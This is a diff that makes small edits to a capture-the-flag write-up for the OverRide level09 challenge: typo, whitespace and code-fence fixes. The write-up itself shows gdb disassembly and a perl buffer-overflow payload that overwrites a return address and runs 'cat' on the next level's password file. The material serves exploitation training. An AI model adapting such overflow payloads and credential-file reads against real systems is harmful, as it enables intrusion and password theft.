@@ -9,8 +9,8 @@ Dump of assembler code for function handle_msg:
    0x00000000000008c0 <+0>:	push   rbp
    0x00000000000008c1 <+1>:	mov    rbp,rsp
    0x00000000000008c4 <+4>:	sub    rsp,0xc0
-   0x00000000000008cb <+11>:	lea    rax,[rbp-0xc0]			; 192 bytes
-   0x00000000000008d2 <+18>:	add    rax,0x8c					; 140 bytes
+   0x00000000000008cb <+11>:	lea    rax,[rbp-0xc0]		; 192 bytes
+   0x00000000000008d2 <+18>:	add    rax,0x8c			; 140 bytes
    0x00000000000008d8 <+24>:	mov    QWORD PTR [rax],0x0
    0x00000000000008df <+31>:	mov    QWORD PTR [rax+0x8],0x0
    0x00000000000008e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
@@ -22,7 +22,7 @@ Dump of assembler code for function handle_msg:
 ```c
 struct mystruct
 {
-	char fisrt[140];
+	char first[140];
 	char second[40];
 	int third;
 };
@@ -30,7 +30,7 @@ struct mystruct
 According to the disassembly, the program defines a structure like this in the `handle_msg` function.
 
 ## Step 2. Find spot to overwrite
-``` assemble
+``` assembly
 level09@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble set_username" level09
 [...]
    0x0000000000000a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0	; initialize i = 0
@@ -91,7 +91,7 @@ We thought that the binary was compiled with PIE(position-independent executable
 
 ## Final step. Build payload
 ```
-level09@OverRide:~$ perl -e 'print "A"x40 . "\xff" . "\n" . "A"x200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "cat /home/users/end/.pass\n"' | ./level09
+level09@OverRide:~$ perl -e 'print "A"x40 . "\xff" . "\n" . "A"x200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "cat /home/users/end/.pass"' | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
